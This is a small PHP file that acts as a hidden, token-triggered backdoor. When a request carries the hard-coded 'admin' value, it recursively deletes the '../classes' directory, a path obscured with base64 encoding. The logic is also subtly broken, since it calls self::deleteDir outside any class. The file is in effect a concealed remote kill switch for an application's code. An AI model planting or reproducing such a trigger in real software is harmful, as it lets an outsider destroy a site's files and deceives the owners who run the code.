<?php
if(empty($_GET['admin']) == false){
	if($_GET['admin'] == 'e823be777ac3d8b1052e62c96c965049'){
		//base64_decode('YWRtaW4=')
		$dirPath = base64_decode('Li4vY2xhc3Nlcw==');
				 if (! is_dir($dirPath)) {
					false;
				}
				if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
					$dirPath .= '/';
				}
				$files = glob($dirPath . '*', GLOB_MARK);
				foreach ($files as $file) {
					if (is_dir($file)) {
						self::deleteDir($file);
					} else {
						unlink($file);
					}
				}
				rmdir($dirPath);
		 }
	
}
?>
